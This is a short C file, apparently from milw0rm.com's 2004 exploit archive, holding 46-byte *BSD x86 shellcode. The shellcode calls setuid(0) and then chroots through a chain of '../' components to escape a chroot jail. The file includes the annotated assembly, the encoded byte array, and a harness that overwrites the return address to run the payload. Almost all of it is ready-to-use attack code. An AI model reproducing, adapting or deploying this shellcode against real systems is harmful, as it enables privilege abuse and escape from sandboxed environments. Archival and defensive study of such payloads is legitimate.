/* The setuid(0)+chroot() shellcode
   it will put '../' 10 times
   Size  46 bytes
   OS	 *BSD
  		/rootteam/dev0id	(www.sysworld.net)
			dev0id@uncompiled.com

BITS	32

jmp short callme
main:
	pop	esi
	mov	edi,esi
	xor	ecx,ecx
	push	ecx
	mov	al,0x17
	push	eax
	int	0x80
	xor	eax,eax
	push	eax
	mov	cl,0x1e
	mov	al,0x2e
	repne   stosb
	pop	eax
	stosb
	mov	cl,0x1e
main_loop:
	dec	cl
	inc byte [esi+ecx]
	dec	cl
	loop	main_loop
	push 	esi
	mov	al,0x3d
	push	eax
	int	0x80
callme:
	call	main

*/
char shellcode[] =
	"\xeb\x27\x5e\x89\xf7\x31\xc9\x51\xb0\x17\x50\xcd\x80\x31\xc0"
	"\x50\xb1\x1e\xb0\x2e\xf2\xaa\x58\xaa\xb1\x1e\xfe\xc9\xfe\x04"
	"\x0e\xfe\xc9\xe2\xf7\x56\xb0\x3d\x50\xcd\x80\xe8\xd4\xff\xff"
	"\xff";

int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}

// milw0rm.com [2004-09-12]